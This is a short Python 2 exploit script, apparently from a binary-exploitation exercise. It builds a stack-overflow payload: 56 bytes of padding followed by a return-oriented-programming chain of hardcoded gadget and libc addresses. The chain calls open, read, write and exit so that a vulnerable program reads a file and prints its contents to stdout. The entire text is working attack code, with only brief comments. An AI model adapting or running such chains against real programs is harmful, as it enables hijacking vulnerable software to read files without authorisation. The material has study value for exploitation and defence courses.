def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s


f = open("./exploit", "w")

payload = ""

payload += "./rop.c\0" # filename
payload = payload.ljust(56, "\x00")

# overwrite return
payload += pack64(0x00005555555549e3) # pop rdi; ret: to pop addr of bud storing filename into rdi
payload += pack64(0x7fffffffe360) # p &buf
payload += pack64(0x00007ffff7deb529) # pop rsi; ret
payload += pack64(0x00) # read_only access mode
# payload += pack64(0x00) # "r15"

payload += pack64(0x7ffff7ed4e50) # open

payload += pack64(0x00005555555549e3) # pop rdi; ret: fd
payload += pack64(0x3)
payload += pack64(0x00007ffff7deb529) # pop rsi; ret
payload += pack64(0x7fffffffd3e0) # place to read into
payload += pack64(0x00007ffff7ee0371) # pop rdx; pop r12; ret
payload += pack64(0x1000) # read 4096 bytes
payload += pack64(0x00) # r12

payload += pack64(0x7ffff7ed5130) # read

payload += pack64(0x00005555555549e3) # pop rdi; ret: fd
payload += pack64(0x01) # stdout
payload += pack64(0x7ffff7ed51d0) # write
payload += pack64(0x00005555555549e3) # pop rdi; ret
payload += pack64(0x0) # exit status
payload += pack64(0x7ffff7e0dbc0) # exit

payload = payload.ljust(100)

f.write(payload)
f.close()